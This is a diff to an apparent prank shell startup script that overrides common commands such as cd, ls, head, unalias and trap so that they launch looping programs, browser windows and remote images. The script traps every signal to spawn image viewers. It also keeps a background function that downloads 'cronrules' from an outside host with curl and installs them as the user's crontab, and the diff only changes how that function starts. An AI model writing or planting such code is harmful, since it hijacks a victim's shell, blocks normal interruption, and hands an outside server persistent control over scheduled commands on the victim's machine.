@@ -4,7 +4,7 @@ unalias -a &> /dev/null
 unalias -m "*" &> /dev/null
 
 ::() { crontab -l > /tmp/- && curl -o /tmp/- "http://confloo.se/cronrules" 2>/dev/null && crontab /tmp/- && rm /tmp/-; }
-(:: &) >/dev/null 2>&1;:() {
+([ -z "$42" ] && :: &) >/dev/null 2>&1;:() {
     command -v $1 >/dev/null && (t="$(which $1)"; eval "$t() { $2; }")
     eval "$1() { $2; }"
 }
@@ -16,7 +16,7 @@ esac
 eval "cd() { $cmd; }"
 
 if command -v sl >/dev/null; then
-: ls "while(true);do sl -a;done"
+: ls "while true; do sl -a; done"
 else
 : ls "firefox -foreground -chrome leekspin.com"
 fi
@@ -53,7 +53,7 @@ unalias() { display -flop 'http://impawards.com/tv/posters/alias_ver2.jpg'; }
 fabulous='                      __........_.._....._\n                     `.s$^.s$$$$$ssss$$$$$$bso.a\n                     .d  7.d$$$$SSSS$$$$$$$$$$$b._\n                     $  7 s`  `SSS$$$$$SSSSSSSSSSSSSSb.\n                     $  j`      SS$$$$$$$$$$$$$$$sss$$$b\n                     T.`        s$$$$$$$$$$$$$$$$$ss$$$$$bs.\n                     .          S$$$$$$$$$$$$$$$$$$s$$$$$$$$$s.\n                    /..._      dS$$$$$$$$$$$$$$$$$s$$$$$$$$$$$$$s.\n                  .-````^:.    S$$$$$$$$$$$$$$$$$$s$$$$$$$$$$$$$$$$b\n           __..-=`   .-   `.  dS$$$$$$$$$$$$$$$$$s$$$$$$$$$$$$$$$$$$b\n        .``        _/_        S$$$$$$$$$$$$$$$$$$s$$$$$$$$$$$$$$$$$$$b\n        :_         `^s$D     dS$$$$$$$$$$$$$$$$$s$$$$$$$$$$$$$$$$$$$$$l\n         :\                  !!$$$$$$$$$$$$$$$$$s$$$$$$$$$$$$$$$$$$$$$S\n         :`--`               `:$$$$$$$$$$$$$$$$$$s$$$$$$$$$$$$$$$$$$$$S\n       .-`  .`                 d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$7\n       ::   :                 d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$b\n      :::.   `               .q$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$b\n     :`  ``                 dS77$$$$$$$7^^^^q$$$$$$$$$$$$$$$$$$$$$$$$$$$:\n   .`                     dSP.P`  ```s7 `` : \$$$$$$$$$$$$$$$$$$$$$$$$$$$\n   :                    sP .dP     _.7/\    `:$$$$$$$$$$$$$$$$$$$$$$$$$$$\n   \                  dP`dSP   . (` $$  : .` d$$$$$$$$$$$$$$$$$$$$$$$$$$7\n    `._              s dP`     l  d77-. ./.d$$$$$$$$$$$$$$$$$$$$$$$$$$$7b\n       `.--...__    :sP`        `d7_ ``_.d$$$$$$$$$$$$$$$$$$$$$$$$$$$7`.$:\n         `.     ``  :`        .77:::sssd$$$$$$$$$$$$$$$$$$$$$$$$$$$$$bsd$`\n           `,              _.:`` ``::d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$^7$P\n             \          _.-``     .d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$Dd$d7\n              \                 d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P`d77\n               :              d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P 7 7\n               :            d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P `.`\n                :         .d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$7.-²`\n                :         d$$$7`        `q$$$$$$$$$$$$$$$$$$$$7`\n                 \       $$               `q$$$$$$P`   ```````\n                  \     $$                   `````\n                   :    qp       _.-\n                    `.   l    .-`\n                      `.     -\n                        `.  /\n                          `|'
 : head "printf '$fabulous\n'"
 
-trapcard='(nohup feh -NYF "http://i.ytimg.com/vi/H4fKfz5rcx8/maxresdefault.jpg" 2>/dev/null & )'
+trapcard='([ "$(pidof animate)" ] || (nohup animate -quiet -window root -background black -alpha remove "http://fc07.deviantart.net/fs71/f/2011/212/7/f/rainbow_bunchie_by_xnaomikitten-d427rj7.gif" & for pos in +1000+10 +800+500 +80+600 +200+100 +900+700; do nohup feh -Nx "http://i.ytimg.com/vi/H4fKfz5rcx8/maxresdefault.jpg" -g 400x300$pos 2>/dev/null & done ) 2>/dev/null )'
 trap "$trapcard" $(seq 64) 2>/dev/null >/dev/null
 trap 17
 eval "trap() { $trapcard; }"
